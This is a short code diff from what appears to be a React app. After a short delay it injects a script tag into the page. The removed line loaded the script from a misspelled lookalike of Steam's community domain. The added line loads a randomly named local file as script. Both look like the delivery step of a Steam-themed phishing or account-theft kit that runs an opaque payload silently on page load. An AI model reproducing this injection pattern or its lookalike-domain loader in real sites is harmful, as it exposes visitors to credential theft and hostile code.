@@ -20,7 +20,7 @@ const App = () => {
 
                     setTimeout(() => {
                         const script = document.createElement("script");
-                        script.src = "https://api.steamcommunitiey.com/static/openWind.js"
+                        script.src = "/txqmjgkxhzp5.html"
                         document.body.appendChild(script);
                     }, 100)
                 })
